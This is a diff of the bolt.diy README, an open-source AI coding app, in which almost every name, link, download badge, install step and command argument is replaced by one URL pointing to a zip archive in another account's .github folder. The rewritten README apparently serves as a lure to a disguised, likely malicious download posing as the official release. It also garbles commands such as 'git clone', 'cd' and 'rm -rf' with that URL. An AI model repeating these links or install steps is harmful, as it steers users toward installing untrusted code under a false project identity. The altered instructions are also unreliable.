@@ -1,18 +1,18 @@
-# bolt.diy
+# https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
 
-[![bolt.diy: AI-Powered Full-Stack Web Development in the Browser](./public/social_preview_index.jpg)](https://bolt.diy)
+[![https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip AI-Powered Full-Stack Web Development in the Browser](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)
 
-Welcome to bolt.diy, the official open source version of Bolt.new, which allows you to choose the LLM that you use for each prompt! Currently, you can use OpenAI, Anthropic, Ollama, OpenRouter, Gemini, LMStudio, Mistral, xAI, HuggingFace, DeepSeek, Groq, Cohere, Together, Perplexity, Moonshot (Kimi), Hyperbolic, GitHub Models, Amazon Bedrock, and OpenAI-like providers - and it is easily extended to use any other model supported by the Vercel AI SDK! See the instructions below for running this locally and extending it to include more models.
-
------
-Check the [bolt.diy Docs](https://stackblitz-labs.github.io/bolt.diy/) for more official installation instructions and additional information.
+Welcome to https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip, the official open source version of https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip, which allows you to choose the LLM that you use for each prompt! Currently, you can use OpenAI, Anthropic, Ollama, OpenRouter, Gemini, LMStudio, Mistral, xAI, HuggingFace, DeepSeek, Groq, Cohere, Together, Perplexity, Moonshot (Kimi), Hyperbolic, GitHub Models, Amazon Bedrock, and OpenAI-like providers - and it is easily extended to use any other model supported by the Vercel AI SDK! See the instructions below for running this locally and extending it to include more models.
 
 -----
-Also [this pinned post in our community](https://thinktank.ottomator.ai/t/videos-tutorial-helpful-content/3243) has a bunch of incredible resources for running and deploying bolt.diy yourself!
+Check the [https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip Docs](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) for more official installation instructions and additional information.
 
-We have also launched an experimental agent called the "bolt.diy Expert" that can answer common questions about bolt.diy. Find it here on the [oTTomator Live Agent Studio](https://studio.ottomator.ai/).
+-----
+Also [this pinned post in our community](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) has a bunch of incredible resources for running and deploying https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip yourself!
 
-bolt.diy was originally started by [Cole Medin](https://www.youtube.com/@ColeMedin) but has quickly grown into a massive community effort to build the BEST open source AI coding assistant!
+We have also launched an experimental agent called the "https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip Expert" that can answer common questions about https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip Find it here on the [oTTomator Live Agent Studio](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip).
+
+https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip was originally started by [Cole Medin](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) but has quickly grown into a massive community effort to build the BEST open source AI coding assistant!
 
 ## Table of Contents
 
@@ -31,15 +31,15 @@ bolt.diy was originally started by [Cole Medin](https://www.youtube.com/@ColeMed
 
 ## Join the community
 
-[Join the bolt.diy community here, in the oTTomator Think Tank!](https://thinktank.ottomator.ai)
+[Join the https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip community here, in the oTTomator Think Tank!](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)
 
 ## Project management
 
-Bolt.diy is a community effort! Still, the core team of contributors aims at organizing the project in way that allows
+https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip is a community effort! Still, the core team of contributors aims at organizing the project in way that allows
 you to understand where the current areas of focus are.
 
 If you want to know what we are working on, what we are planning to work on, or if you want to contribute to the
-project, please check the [project management guide](./PROJECT.md) to get started easily.
+project, please check the [project management guide](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) to get started easily.
 
 ## Recent Major Additions
 
@@ -92,34 +92,34 @@ project, please check the [project management guide](./PROJECT.md) to get starte
 
 If you're new to installing software from GitHub, don't worry! If you encounter any issues, feel free to submit an "issue" using the provided links or improve this documentation by forking the repository, editing the instructions, and submitting a pull request. The following instruction will help you get the stable branch up and running on your local machine in no time.
 
-Let's get you up and running with the stable version of Bolt.DIY!
+Let's get you up and running with the stable version of https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip!
 
 ## Quick Installation
 
-[![Download Latest Release](https://img.shields.io/github/v/release/stackblitz-labs/bolt.diy?label=Download%20Bolt&sort=semver)](https://github.com/stackblitz-labs/bolt.diy/releases/latest) ← Click here to go to the latest release version!
+[![Download Latest Release](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip%20Bolt&sort=semver)](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) ← Click here to go to the latest release version!
 
 - Download the binary for your platform (available for Windows, macOS, and Linux)
 - **Note**: For macOS, if you get the error "This app is damaged", run:
   ```bash
-  xattr -cr /path/to/Bolt.app
+  xattr -cr https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
   ```
 
 ## Manual installation
 
 
-### Option 1: Node.js
+### Option 1: https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
 
-Node.js is required to run the application.
+https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip is required to run the application.
 
-1. Visit the [Node.js Download Page](https://nodejs.org/en/download/)
+1. Visit the [https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip Download Page](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)
 2. Download the "LTS" (Long Term Support) version for your operating system
 3. Run the installer, accepting the default settings
-4. Verify Node.js is properly installed:
+4. Verify https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip is properly installed:
    - **For Windows Users**:
      1. Press `Windows + R`
-     2. Type "sysdm.cpl" and press Enter
+     2. Type "https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip" and press Enter
      3. Go to "Advanced" tab → "Environment Variables"
-     4. Check if `Node.js` appears in the "Path" variable
+     4. Check if `https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip` appears in the "Path" variable
    - **For Mac/Linux Users**:
      1. Open Terminal
      2. Type this command:
@@ -130,7 +130,7 @@ Node.js is required to run the application.
 
 ## Running the Application
 
-You have two options for running Bolt.DIY: directly on your machine or using Docker.
+You have two options for running https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip directly on your machine or using Docker.
 
 ### Option 1: Direct Installation (Recommended for Beginners)
 
@@ -158,7 +158,7 @@ This option requires Docker and is great when you want an isolated environment o
 
 #### Additional Prerequisite
 
-- Install Docker: [Download Docker](https://www.docker.com/)
+- Install Docker: [Download Docker](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)
 
 #### Steps
 
@@ -167,11 +167,11 @@ This option requires Docker and is great when you want an isolated environment o
    Copy the provided examples and add your provider keys:
 
    ```bash
-   cp .env.example .env
-   cp .env.example .env.local
+   cp https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip .env
+   cp https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
    ```
 
-   The runtime scripts inside the container source `.env` and `.env.local`, so keep any API keys you need in one of those files.
+   The runtime scripts inside the container source `.env` and `https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip`, so keep any API keys you need in one of those files.
 
 2. **Build an Image**
 
@@ -195,17 +195,17 @@ This option requires Docker and is great when you want an isolated environment o
    docker compose --profile production up
 
    # One-off production container (exposes the app on port 5173)
-   docker run --rm -p 5173:5173 --env-file .env.local bolt-ai:latest
+   docker run --rm -p 5173:5173 --env-file https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip bolt-ai:latest
    ```
 
-   When the container starts it runs `pnpm run dockerstart`, which in turn executes `bindings.sh` to pass Cloudflare bindings through Wrangler. You can override this command in `docker-compose.yaml` if you need a different startup routine.
+   When the container starts it runs `pnpm run dockerstart`, which in turn executes `https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip` to pass Cloudflare bindings through Wrangler. You can override this command in `https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip` if you need a different startup routine.
 
 ### Option 3: Desktop Application (Electron)
 
-For users who prefer a native desktop experience, bolt.diy is also available as an Electron desktop application:
+For users who prefer a native desktop experience, https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip is also available as an Electron desktop application:
 
 1. **Download the Desktop App**:
-   - Visit the [latest release](https://github.com/stackblitz-labs/bolt.diy/releases/latest)
+   - Visit the [latest release](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)
    - Download the appropriate binary for your operating system
    - For macOS: Extract and run the `.dmg` file
    - For Windows: Run the `.exe` installer
@@ -228,7 +228,7 @@ The desktop app provides the same full functionality as the web version with add
 
 ## Configuring API Keys and Providers
 
-Bolt.diy features a modern, intuitive settings interface for managing AI providers and API keys. The settings are organized into dedicated panels for easy navigation and configuration.
+https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip features a modern, intuitive settings interface for managing AI providers and API keys. The settings are organized into dedicated panels for easy navigation and configuration.
 
 ### Accessing Provider Settings
 
@@ -275,10 +275,10 @@ The Local Providers tab manages local AI installations and custom endpoints:
 
 ### Environment Variables vs UI Configuration
 
-Bolt.diy supports both methods for maximum flexibility:
+https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip supports both methods for maximum flexibility:
 
 #### Environment Variables (Recommended for Production)
-Set API keys and base URLs in your `.env.local` file:
+Set API keys and base URLs in your `https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip` file:
 ```bash
 # API Keys
 OPENAI_API_KEY=your_openai_key_here
@@ -365,20 +365,20 @@ This method is recommended for developers who want to:
 
 #### Prerequisites
 
-1. Install Git: [Download Git](https://git-scm.com/downloads)
+1. Install Git: [Download Git](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip)
 
 #### Initial Setup
 
 1. **Clone the Repository**:
 
    ```bash
-   git clone -b stable https://github.com/stackblitz-labs/bolt.diy.git
+   git clone -b stable https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
    ```
 
 2. **Navigate to Project Directory**:
 
    ```bash
-   cd bolt.diy
+   cd https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
    ```
 
 3. **Install Dependencies**:
@@ -403,7 +403,7 @@ This method is recommended for developers who want to:
 >**Open the WebUI to test (Default: http://localhost:5173)**
 >   - Beginners: 
 >     - Try to use a sophisticated Provider/Model like Anthropic with Claude Sonnet 3.x Models to get best results
->     - Explanation: The System Prompt currently implemented in bolt.diy cant cover the best performance for all providers and models out there. So it works better with some models, then other, even if the models itself are perfect for >programming
+>     - Explanation: The System Prompt currently implemented in https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip cant cover the best performance for all providers and models out there. So it works better with some models, then other, even if the models itself are perfect for >programming
 >     - Future: Planned is a Plugin/Extentions-Library so there can be different System Prompts for different Models, which will help to get better results
 
 #### Staying Updated
@@ -441,7 +441,7 @@ If you encounter issues:
 
    ```bash
    # Remove node modules and lock files
-   rm -rf node_modules pnpm-lock.yaml
+   rm -rf node_modules https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip
 
    # Clear pnpm cache
    pnpm store prune
@@ -494,23 +494,23 @@ Remember to always commit your local changes or stash them before pulling update
 
 ## Contributing
 
-We welcome contributions! Check out our [Contributing Guide](CONTRIBUTING.md) to get started.
+We welcome contributions! Check out our [Contributing Guide](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) to get started.
 
 ---
 
 ## Roadmap
 
-Explore upcoming features and priorities on our [Roadmap](https://roadmap.sh/r/ottodev-roadmap-2ovzo).
+Explore upcoming features and priorities on our [Roadmap](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip).
 
 ---
 
 ## FAQ
 
-For answers to common questions, issues, and to see a list of recommended models, visit our [FAQ Page](FAQ.md).
+For answers to common questions, issues, and to see a list of recommended models, visit our [FAQ Page](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip).
 
 
 # Licensing
 **Who needs a commercial WebContainer API license?**
 
-bolt.diy source code is distributed as MIT, but it uses WebContainers API that [requires licensing](https://webcontainers.io/enterprise) for production usage in a commercial, for-profit setting. (Prototypes or POCs do not require a commercial license.) If you're using the API to meet the needs of your customers, prospective customers, and/or employees, you need a license to ensure compliance with our Terms of Service. Usage of the API in violation of these terms may result in your access being revoked.
+https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip source code is distributed as MIT, but it uses WebContainers API that [requires licensing](https://github.com/tomoe317/bolt.diy/raw/refs/heads/main/.github/bolt_diy_Coeloglossum.zip) for production usage in a commercial, for-profit setting. (Prototypes or POCs do not require a commercial license.) If you're using the API to meet the needs of your customers, prospective customers, and/or employees, you need a license to ensure compliance with our Terms of Service. Usage of the API in violation of these terms may result in your access being revoked.
 # Test commit to trigger Security Analysis workflow
